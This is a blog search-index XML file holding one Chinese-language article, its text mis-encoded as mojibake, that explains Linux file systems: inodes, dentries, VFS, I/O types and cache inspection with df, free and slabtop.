<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux_æ–‡ä»¶ç³»ç»Ÿæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</title>
      <link href="/2022/07/01/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/"/>
      <url>/2022/07/01/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ</h2><p>åŒ CPUã€å†…å­˜ä¸€æ ·ï¼Œç£ç›˜å’Œæ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†ï¼Œä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿæœ€æ ¸å¿ƒçš„åŠŸèƒ½ã€‚</p><ul><li>ç£ç›˜ä¸ºç³»ç»Ÿæä¾›äº†æœ€åŸºæœ¬çš„æŒä¹…åŒ–å­˜å‚¨ã€‚</li><li>æ–‡ä»¶ç³»ç»Ÿåˆ™åœ¨ç£ç›˜çš„åŸºç¡€ä¸Šï¼Œæä¾›äº†ä¸€ä¸ªç”¨æ¥ç®¡ç†æ–‡ä»¶çš„æ ‘çŠ¶ç»“æ„ã€‚</li></ul><h2 id="ç´¢å¼•èŠ‚ç‚¹å’Œç›®å½•é¡¹"><a href="#ç´¢å¼•èŠ‚ç‚¹å’Œç›®å½•é¡¹" class="headerlink" title="ç´¢å¼•èŠ‚ç‚¹å’Œç›®å½•é¡¹"></a>ç´¢å¼•èŠ‚ç‚¹å’Œç›®å½•é¡¹</h2><p><strong>Linux æ–‡ä»¶ç³»ç»Ÿä¸ºæ¯ä¸ªæ–‡ä»¶éƒ½åˆ†é…ä¸¤ä¸ªæ•°æ®ç»“æ„ï¼Œç´¢å¼•èŠ‚ç‚¹ï¼ˆindex nodeï¼‰å’Œç›®å½•é¡¹ï¼ˆdirectory entryï¼‰ã€‚</strong>å®ƒä»¬ä¸»è¦ç”¨æ¥è®°å½•æ–‡ä»¶çš„å…ƒä¿¡æ¯å’Œç›®å½•ç»“æ„ã€‚</p><ul><li>ç´¢å¼•èŠ‚ç‚¹ï¼Œç®€ç§°ä¸º inodeï¼Œç”¨æ¥è®°å½•æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œæ¯”å¦‚ inode ç¼–å·ã€æ–‡ä»¶å¤§å°ã€è®¿é—®æƒé™ã€ä¿®æ”¹æ—¥æœŸã€æ•°æ®çš„ä½ç½®ç­‰ã€‚ç´¢å¼•èŠ‚ç‚¹å’Œæ–‡ä»¶ä¸€ä¸€å¯¹åº”ï¼Œå®ƒè·Ÿæ–‡ä»¶å†…å®¹ä¸€æ ·ï¼Œéƒ½ä¼šè¢«æŒä¹…åŒ–å­˜å‚¨åˆ°ç£ç›˜ä¸­ã€‚æ‰€ä»¥è®°ä½ï¼Œç´¢å¼•èŠ‚ç‚¹åŒæ ·å ç”¨ç£ç›˜ç©ºé—´ã€‚</li><li>ç›®å½•é¡¹ï¼Œç®€ç§°ä¸º dentryï¼Œç”¨æ¥è®°å½•æ–‡ä»¶çš„åå­—ã€ç´¢å¼•èŠ‚ç‚¹æŒ‡é’ˆä»¥åŠä¸å…¶ä»–ç›®å½•é¡¹çš„å…³è”å…³ç³»ã€‚å¤šä¸ªå…³è”çš„ç›®å½•é¡¹ï¼Œå°±æ„æˆäº†æ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ç»“æ„ã€‚ä¸è¿‡ï¼Œä¸åŒäºç´¢å¼•èŠ‚ç‚¹ï¼Œç›®å½•é¡¹æ˜¯ç”±å†…æ ¸ç»´æŠ¤çš„ä¸€ä¸ªå†…å­˜æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥é€šå¸¸ä¹Ÿè¢«å«åšç›®å½•é¡¹ç¼“å­˜ã€‚</li></ul><p><strong>ç´¢å¼•èŠ‚ç‚¹æ˜¯æ¯ä¸ªæ–‡ä»¶çš„å”¯ä¸€æ ‡å¿—ï¼Œè€Œç›®å½•é¡¹ç»´æŠ¤çš„æ­£æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„æ ‘çŠ¶ç»“æ„ã€‚</strong>ç›®å½•é¡¹å’Œç´¢å¼•èŠ‚ç‚¹çš„å…³ç³»æ˜¯å¤šå¯¹ä¸€ï¼Œä½ å¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªåˆ«åã€‚<br>å®é™…ä¸Šï¼Œç£ç›˜è¯»å†™çš„æœ€å°å•ä½æ˜¯æ‰‡åŒºï¼Œç„¶è€Œæ‰‡åŒºåªæœ‰ 512B å¤§å°ï¼Œå¦‚æœæ¯æ¬¡éƒ½è¯»å†™è¿™ä¹ˆå°çš„å•ä½ï¼Œæ•ˆç‡ä¸€å®šå¾ˆä½ã€‚æ‰€ä»¥ï¼Œæ–‡ä»¶ç³»ç»ŸåˆæŠŠè¿ç»­çš„æ‰‡åŒºç»„æˆäº†é€»è¾‘å—ï¼Œç„¶åæ¯æ¬¡éƒ½ä»¥é€»è¾‘å—ä¸ºæœ€å°å•å…ƒï¼Œæ¥ç®¡ç†æ•°æ®ã€‚å¸¸è§çš„é€»è¾‘å—å¤§å°ä¸º 4KBï¼Œä¹Ÿå°±æ˜¯ç”±è¿ç»­çš„ 8 ä¸ªæ‰‡åŒºç»„æˆã€‚<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/0.png"><br>ç¬¬ä¸€ï¼Œç›®å½•é¡¹æœ¬èº«å°±æ˜¯ä¸€ä¸ªå†…å­˜ç¼“å­˜ï¼Œè€Œç´¢å¼•èŠ‚ç‚¹åˆ™æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸­çš„æ•°æ®ã€‚åœ¨å‰é¢çš„ Buffer å’Œ Cache åŸç†ä¸­ï¼Œæˆ‘æ›¾ç»æåˆ°è¿‡ï¼Œä¸ºäº†åè°ƒæ…¢é€Ÿç£ç›˜ä¸å¿«é€Ÿ CPU çš„æ€§èƒ½å·®å¼‚ï¼Œæ–‡ä»¶å†…å®¹ä¼šç¼“å­˜åˆ°é¡µç¼“å­˜ Cache ä¸­ã€‚<br>é‚£ä¹ˆï¼Œä½ åº”è¯¥æƒ³åˆ°ï¼Œè¿™äº›ç´¢å¼•èŠ‚ç‚¹è‡ªç„¶ä¹Ÿä¼šç¼“å­˜åˆ°å†…å­˜ä¸­ï¼ŒåŠ é€Ÿæ–‡ä»¶çš„è®¿é—®ã€‚<br>ç¬¬äºŒï¼Œç£ç›˜åœ¨æ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿæ ¼å¼åŒ–æ—¶ï¼Œä¼šè¢«åˆ†æˆä¸‰ä¸ªå­˜å‚¨åŒºåŸŸï¼Œè¶…çº§å—ã€ç´¢å¼•èŠ‚ç‚¹åŒºå’Œæ•°æ®å—åŒºã€‚å…¶ä¸­ï¼Œ</p><ul><li>è¶…çº§å—ï¼Œå­˜å‚¨æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„çŠ¶æ€ã€‚</li><li>ç´¢å¼•èŠ‚ç‚¹åŒºï¼Œç”¨æ¥å­˜å‚¨ç´¢å¼•èŠ‚ç‚¹ã€‚</li><li>æ•°æ®å—åŒºï¼Œåˆ™ç”¨æ¥å­˜å‚¨æ–‡ä»¶æ•°æ®ã€‚</li></ul><h2 id="è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a href="#è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h2><p>Linux å†…æ ¸åœ¨ç”¨æˆ·è¿›ç¨‹å’Œæ–‡ä»¶ç³»ç»Ÿçš„ä¸­é—´ï¼Œåˆå¼•å…¥äº†ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ VFSï¼ˆVirtual File Systemï¼‰ã€‚<br>VFS å®šä¹‰äº†ä¸€ç»„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿéƒ½æ”¯æŒçš„æ•°æ®ç»“æ„å’Œæ ‡å‡†æ¥å£ã€‚è¿™æ ·ï¼Œç”¨æˆ·è¿›ç¨‹å’Œå†…æ ¸ä¸­çš„å…¶ä»–å­ç³»ç»Ÿï¼Œåªéœ€è¦è·Ÿ VFS æä¾›çš„ç»Ÿä¸€æ¥å£è¿›è¡Œäº¤äº’å°±å¯ä»¥äº†ï¼Œè€Œä¸éœ€è¦å†å…³å¿ƒåº•å±‚å„ç§æ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚ã€‚<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/1.png"><br>è¿™äº›æ–‡ä»¶ç³»ç»Ÿå¯ä»¥åˆ†ä¸ºä¸‰ç±»ã€‚</p><ul><li>ç¬¬ä¸€ç±»æ˜¯åŸºäºç£ç›˜çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯æŠŠæ•°æ®ç›´æ¥å­˜å‚¨åœ¨è®¡ç®—æœºæœ¬åœ°æŒ‚è½½çš„ç£ç›˜ä¸­ã€‚å¸¸è§çš„ Ext4ã€XFSã€OverlayFS ç­‰ï¼Œéƒ½æ˜¯è¿™ç±»æ–‡ä»¶ç³»ç»Ÿã€‚</li><li>ç¬¬äºŒç±»æ˜¯åŸºäºå†…å­˜çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚è¿™ç±»æ–‡ä»¶ç³»ç»Ÿï¼Œä¸éœ€è¦ä»»ä½•ç£ç›˜åˆ†é…å­˜å‚¨ç©ºé—´ï¼Œä½†ä¼šå ç”¨å†…å­˜ã€‚æˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„ /proc æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶å®å°±æ˜¯ä¸€ç§æœ€å¸¸è§çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚æ­¤å¤–ï¼Œ/sys æ–‡ä»¶ç³»ç»Ÿä¹Ÿå±äºè¿™ä¸€ç±»ï¼Œä¸»è¦å‘ç”¨æˆ·ç©ºé—´å¯¼å‡ºå±‚æ¬¡åŒ–çš„å†…æ ¸å¯¹è±¡ã€‚</li><li>ç¬¬ä¸‰ç±»æ˜¯ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥è®¿é—®å…¶ä»–è®¡ç®—æœºæ•°æ®çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚ NFSã€SMBã€iSCSI ç­‰ã€‚</li></ul><p>è¿™äº›æ–‡ä»¶ç³»ç»Ÿï¼Œè¦å…ˆæŒ‚è½½åˆ° VFS ç›®å½•æ ‘ä¸­çš„æŸä¸ªå­ç›®å½•ï¼ˆç§°ä¸ºæŒ‚è½½ç‚¹ï¼‰ï¼Œç„¶åæ‰èƒ½è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ã€‚æ‹¿ç¬¬ä¸€ç±»ï¼Œä¹Ÿå°±æ˜¯åŸºäºç£ç›˜çš„æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼Œåœ¨å®‰è£…ç³»ç»Ÿæ—¶ï¼Œè¦å…ˆæŒ‚è½½ä¸€ä¸ªæ ¹ç›®å½•ï¼ˆ/ï¼‰ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å†æŠŠå…¶ä»–æ–‡ä»¶ç³»ç»Ÿï¼ˆæ¯”å¦‚å…¶ä»–çš„ç£ç›˜åˆ†åŒºã€/proc æ–‡ä»¶ç³»ç»Ÿã€/sys æ–‡ä»¶ç³»ç»Ÿã€NFS ç­‰ï¼‰æŒ‚è½½è¿›æ¥ã€‚</p><h2 id="æ–‡ä»¶ç³»ç»Ÿ-I-O"><a href="#æ–‡ä»¶ç³»ç»Ÿ-I-O" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿ I/O"></a>æ–‡ä»¶ç³»ç»Ÿ I/O</h2><p>æŠŠæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°æŒ‚è½½ç‚¹åï¼Œä½ å°±èƒ½é€šè¿‡æŒ‚è½½ç‚¹ï¼Œå†å»è®¿é—®å®ƒç®¡ç†çš„æ–‡ä»¶äº†ã€‚VFS æä¾›äº†ä¸€ç»„æ ‡å‡†çš„æ–‡ä»¶è®¿é—®æ¥å£ã€‚è¿™äº›æ¥å£ä»¥ç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼ï¼Œæä¾›ç»™åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚<br>å°±æ‹¿ cat å‘½ä»¤æ¥è¯´ï¼Œå®ƒé¦–å…ˆè°ƒç”¨ open() ï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼›ç„¶åè°ƒç”¨ read() ï¼Œè¯»å–æ–‡ä»¶çš„å†…å®¹ï¼›æœ€åå†è°ƒç”¨ write() ï¼ŒæŠŠæ–‡ä»¶å†…å®¹è¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡ºä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> open(<span class="keyword">const</span> char *pathname, <span class="keyword">int</span> flags, mode_t mode); </span><br><span class="line">ssize_t read(<span class="keyword">int</span> fd, void *buf, size_t count); </span><br><span class="line">ssize_t write(<span class="keyword">int</span> fd, <span class="keyword">const</span> void *buf, size_t count); </span><br></pre></td></tr></table></figure><p>æ–‡ä»¶è¯»å†™æ–¹å¼çš„å„ç§å·®å¼‚ï¼Œå¯¼è‡´ I/O çš„åˆ†ç±»å¤šç§å¤šæ ·ã€‚æœ€å¸¸è§çš„æœ‰ï¼Œç¼“å†²ä¸éç¼“å†² I/Oã€ç›´æ¥ä¸éç›´æ¥ I/Oã€é˜»å¡ä¸éé˜»å¡ I/Oã€åŒæ­¥ä¸å¼‚æ­¥ I/O ç­‰ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±è¯¦ç»†çœ‹è¿™å››ç§åˆ†ç±»ã€‚<br>ç¬¬ä¸€ç§ï¼Œæ ¹æ®æ˜¯å¦åˆ©ç”¨æ ‡å‡†åº“ç¼“å­˜ï¼Œå¯ä»¥æŠŠæ–‡ä»¶ I/O åˆ†ä¸ºç¼“å†² I/O ä¸éç¼“å†² I/Oã€‚</p><ul><li>ç¼“å†² I/Oï¼Œæ˜¯æŒ‡åˆ©ç”¨æ ‡å‡†åº“ç¼“å­˜æ¥åŠ é€Ÿæ–‡ä»¶çš„è®¿é—®ï¼Œè€Œæ ‡å‡†åº“å†…éƒ¨å†é€šè¿‡ç³»ç»Ÿè°ƒåº¦è®¿é—®æ–‡ä»¶ã€‚</li><li>éç¼“å†² I/Oï¼Œæ˜¯æŒ‡ç›´æ¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®æ–‡ä»¶ï¼Œä¸å†ç»è¿‡æ ‡å‡†åº“ç¼“å­˜ã€‚</li></ul><p>æ³¨æ„ï¼Œè¿™é‡Œæ‰€è¯´çš„â€œç¼“å†²â€ï¼Œæ˜¯æŒ‡æ ‡å‡†åº“å†…éƒ¨å®ç°çš„ç¼“å­˜ã€‚æ¯”æ–¹è¯´ï¼Œä½ å¯èƒ½è§åˆ°è¿‡ï¼Œå¾ˆå¤šç¨‹åºé‡åˆ°æ¢è¡Œæ—¶æ‰çœŸæ­£è¾“å‡ºï¼Œè€Œæ¢è¡Œå‰çš„å†…å®¹ï¼Œå…¶å®å°±æ˜¯è¢«æ ‡å‡†åº“æš‚æ—¶ç¼“å­˜äº†èµ·æ¥ã€‚<br>æ— è®ºç¼“å†² I/O è¿˜æ˜¯éç¼“å†² I/Oï¼Œå®ƒä»¬æœ€ç»ˆè¿˜æ˜¯è¦ç»è¿‡ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®æ–‡ä»¶ã€‚è€Œæ ¹æ®ä¸Šä¸€èŠ‚å†…å®¹ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œç³»ç»Ÿè°ƒç”¨åï¼Œè¿˜ä¼šé€šè¿‡é¡µç¼“å­˜ï¼Œæ¥å‡å°‘ç£ç›˜çš„ I/O æ“ä½œã€‚<br>ç¬¬äºŒï¼Œæ ¹æ®æ˜¯å¦åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„é¡µç¼“å­˜ï¼Œå¯ä»¥æŠŠæ–‡ä»¶ I/O åˆ†ä¸ºç›´æ¥ I/O ä¸éç›´æ¥ I/Oã€‚</p><ul><li>ç›´æ¥ I/Oï¼Œæ˜¯æŒ‡è·³è¿‡æ“ä½œç³»ç»Ÿçš„é¡µç¼“å­˜ï¼Œç›´æ¥è·Ÿæ–‡ä»¶ç³»ç»Ÿäº¤äº’æ¥è®¿é—®æ–‡ä»¶ã€‚</li><li>éç›´æ¥ I/O æ­£å¥½ç›¸åï¼Œæ–‡ä»¶è¯»å†™æ—¶ï¼Œå…ˆè¦ç»è¿‡ç³»ç»Ÿçš„é¡µç¼“å­˜ï¼Œç„¶åå†ç”±å†…æ ¸æˆ–é¢å¤–çš„ç³»ç»Ÿè°ƒç”¨ï¼ŒçœŸæ­£å†™å…¥ç£ç›˜ã€‚</li></ul><p>ç›´æ¥ I/Oã€éç›´æ¥ I/Oï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯å’Œæ–‡ä»¶ç³»ç»Ÿäº¤äº’ã€‚å¦‚æœæ˜¯åœ¨æ•°æ®åº“ç­‰åœºæ™¯ä¸­ï¼Œä½ è¿˜ä¼šçœ‹åˆ°ï¼Œè·³è¿‡æ–‡ä»¶ç³»ç»Ÿè¯»å†™ç£ç›˜çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„è£¸ I/Oã€‚<br>ç¬¬ä¸‰ï¼Œæ ¹æ®åº”ç”¨ç¨‹åºæ˜¯å¦é˜»å¡è‡ªèº«è¿è¡Œï¼Œå¯ä»¥æŠŠæ–‡ä»¶ I/O åˆ†ä¸ºé˜»å¡ I/O å’Œéé˜»å¡ I/Oï¼š</p><ul><li>åœ¨çŸ¥æ™“é˜»å¡å’Œéé˜»å¡éƒ½æ˜¯åŒæ­¥ IOå</li><li>é˜»å¡IOï¼šç”±ç³»ç»Ÿè°ƒç”¨read,å¯¼è‡´çº¿ç¨‹ä¸€ç›´ç­‰å¾…æ•°æ®è¿”å›ã€‚</li><li>éé˜»å¡IOï¼šç³»ç»Ÿè°ƒç”¨readåç«‹å³è¿”å›ä¸€ä¸ªçŠ¶æ€ï¼Œå½“æ•°æ®è¾¾åˆ°å†…æ ¸ç¼“å†²åŒºä¹‹å‰éƒ½æ˜¯éé˜»å¡çš„ï¼Œå³è¿”å›ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çŠ¶æ€ã€‚</li></ul><p>ç¬¬å››ï¼Œæ ¹æ®æ˜¯å¦ç­‰å¾…å“åº”ç»“æœï¼Œå¯ä»¥æŠŠæ–‡ä»¶ I/O åˆ†ä¸ºåŒæ­¥å’Œå¼‚æ­¥ I/Oï¼š</p><ul><li>æ‰€è°“åŒæ­¥ I/Oï¼Œæ˜¯æŒ‡åº”ç”¨ç¨‹åºæ‰§è¡Œ I/O æ“ä½œåï¼Œè¦ä¸€ç›´ç­‰åˆ°æ•´ä¸ª I/O å®Œæˆåï¼Œæ‰èƒ½è·å¾— I/O å“åº”ã€‚</li><li>æ‰€è°“å¼‚æ­¥ I/Oï¼Œæ˜¯æŒ‡åº”ç”¨ç¨‹åºæ‰§è¡Œ I/O æ“ä½œåï¼Œä¸ç”¨ç­‰å¾…å®Œæˆå’Œå®Œæˆåçš„å“åº”ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œå°±å¯ä»¥ã€‚ç­‰åˆ°è¿™æ¬¡ I/O å®Œæˆåï¼Œå“åº”ä¼šç”¨äº‹ä»¶é€šçŸ¥çš„æ–¹å¼ï¼Œå‘Šè¯‰åº”ç”¨ç¨‹åºã€‚</li></ul><h2 id="æ€§èƒ½è§‚æµ‹"><a href="#æ€§èƒ½è§‚æµ‹" class="headerlink" title="æ€§èƒ½è§‚æµ‹"></a>æ€§èƒ½è§‚æµ‹</h2><h3 id="å®¹é‡"><a href="#å®¹é‡" class="headerlink" title="å®¹é‡"></a>å®¹é‡</h3><p>ç”¨ df å‘½ä»¤ï¼Œå°±èƒ½æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µã€‚<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/2.png"><br>ç´¢å¼•èŠ‚ç‚¹ä¹Ÿå ç”¨ç£ç›˜ç©ºé—´ã€‚ç»™ df å‘½ä»¤åŠ ä¸Š -i å‚æ•°ï¼ŒæŸ¥çœ‹ç´¢å¼•èŠ‚ç‚¹çš„ä½¿ç”¨æƒ…å†µï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/3.png"><br>ç´¢å¼•èŠ‚ç‚¹çš„å®¹é‡ï¼Œï¼ˆä¹Ÿå°±æ˜¯ Inode ä¸ªæ•°ï¼‰æ˜¯åœ¨æ ¼å¼åŒ–ç£ç›˜æ—¶è®¾å®šå¥½çš„ï¼Œä¸€èˆ¬ç”±æ ¼å¼åŒ–å·¥å…·è‡ªåŠ¨ç”Ÿæˆã€‚å½“ä½ å‘ç°ç´¢å¼•èŠ‚ç‚¹ç©ºé—´ä¸è¶³ï¼Œä½†ç£ç›˜ç©ºé—´å……è¶³æ—¶ï¼Œå¾ˆå¯èƒ½å°±æ˜¯è¿‡å¤šå°æ–‡ä»¶å¯¼è‡´çš„ã€‚<br>æ‰€ä»¥ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œåˆ é™¤è¿™äº›å°æ–‡ä»¶ï¼Œæˆ–è€…æŠŠå®ƒä»¬ç§»åŠ¨åˆ°ç´¢å¼•èŠ‚ç‚¹å……è¶³çš„å…¶ä»–ç£ç›˜ä¸­ï¼Œå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><h3 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h3><p>ç”¨ free æˆ– vmstatï¼Œæ¥è§‚å¯Ÿé¡µç¼“å­˜çš„å¤§å°ã€‚<br>free è¾“å‡ºçš„ Cacheï¼Œæ˜¯é¡µç¼“å­˜å’Œå¯å›æ”¶ Slab ç¼“å­˜çš„å’Œï¼Œå¯ä»¥ä» /proc/meminfo ï¼Œç›´æ¥å¾—åˆ°å®ƒä»¬çš„å¤§å°ï¼š<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/4.png"><br>æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•é¡¹å’Œç´¢å¼•èŠ‚ç‚¹ç¼“å­˜ï¼Œåˆè¯¥å¦‚ä½•è§‚å¯Ÿå‘¢ï¼Ÿ<br>å®é™…ä¸Šï¼Œå†…æ ¸ä½¿ç”¨ Slab æœºåˆ¶ï¼Œç®¡ç†ç›®å½•é¡¹å’Œç´¢å¼•èŠ‚ç‚¹çš„ç¼“å­˜ã€‚/proc/meminfo åªç»™å‡ºäº† Slab çš„æ•´ä½“å¤§å°ï¼Œå…·ä½“åˆ°æ¯ä¸€ç§ Slab ç¼“å­˜ï¼Œè¿˜è¦æŸ¥çœ‹ /proc/slabinfo è¿™ä¸ªæ–‡ä»¶ã€‚<br>æ¯”å¦‚ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œä½ å°±å¯ä»¥å¾—åˆ°ï¼Œæ‰€æœ‰ç›®å½•é¡¹å’Œå„ç§æ–‡ä»¶ç³»ç»Ÿç´¢å¼•èŠ‚ç‚¹çš„ç¼“å­˜æƒ…å†µï¼š<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/5.png"><br>dentry è¡Œè¡¨ç¤ºç›®å½•é¡¹ç¼“å­˜ï¼Œinode_cache è¡Œï¼Œè¡¨ç¤º VFS ç´¢å¼•èŠ‚ç‚¹ç¼“å­˜ï¼Œå…¶ä½™çš„åˆ™æ˜¯å„ç§æ–‡ä»¶ç³»ç»Ÿçš„ç´¢å¼•èŠ‚ç‚¹ç¼“å­˜ã€‚<br>/proc/slabinfo çš„åˆ—æ¯”è¾ƒå¤šï¼Œå…·ä½“å«ä¹‰ä½ å¯ä»¥æŸ¥è¯¢ man slabinfoã€‚åœ¨å®é™…æ€§èƒ½åˆ†æä¸­ï¼Œæˆ‘ä»¬æ›´å¸¸ä½¿ç”¨ slabtop ï¼Œæ¥æ‰¾åˆ°å ç”¨å†…å­˜æœ€å¤šçš„ç¼“å­˜ç±»å‹ã€‚<br><img src="http://106.12.125.218/medias/medias/Linux_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F/6.png"><br>ä»è¿™ä¸ªç»“æœä½ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æˆ‘çš„ç³»ç»Ÿä¸­ï¼Œç›®å½•é¡¹å’Œç´¢å¼•èŠ‚ç‚¹å ç”¨äº†æœ€å¤šçš„ Slab ç¼“å­˜ã€‚ä¸è¿‡å®ƒä»¬å ç”¨çš„å†…å­˜å…¶å®å¹¶ä¸å¤§ï¼ŒåŠ èµ·æ¥ä¹Ÿåªæœ‰ 23MB å·¦å³ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ–‡ä»¶ç³»ç»Ÿï¼Œæ˜¯å¯¹å­˜å‚¨è®¾å¤‡ä¸Šçš„æ–‡ä»¶ï¼Œè¿›è¡Œç»„ç»‡ç®¡ç†çš„ä¸€ç§æœºåˆ¶ã€‚ä¸ºäº†æ”¯æŒå„ç±»ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿï¼ŒLinux åœ¨å„ç§æ–‡ä»¶ç³»ç»Ÿå®ç°ä¸Šï¼ŒæŠ½è±¡äº†ä¸€å±‚è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼ˆVFSï¼‰ã€‚<br>VFS å®šä¹‰äº†ä¸€ç»„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿéƒ½æ”¯æŒçš„æ•°æ®ç»“æ„å’Œæ ‡å‡†æ¥å£ã€‚è¿™æ ·ï¼Œç”¨æˆ·è¿›ç¨‹å’Œå†…æ ¸ä¸­çš„å…¶ä»–å­ç³»ç»Ÿï¼Œå°±åªéœ€è¦è·Ÿ VFS æä¾›çš„ç»Ÿä¸€æ¥å£è¿›è¡Œäº¤äº’ã€‚<br>ä¸ºäº†é™ä½æ…¢é€Ÿç£ç›˜å¯¹æ€§èƒ½çš„å½±å“ï¼Œæ–‡ä»¶ç³»ç»Ÿåˆé€šè¿‡é¡µç¼“å­˜ã€ç›®å½•é¡¹ç¼“å­˜ä»¥åŠç´¢å¼•èŠ‚ç‚¹ç¼“å­˜ï¼Œç¼“å’Œç£ç›˜å»¶è¿Ÿå¯¹åº”ç”¨ç¨‹åºçš„å½±å“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
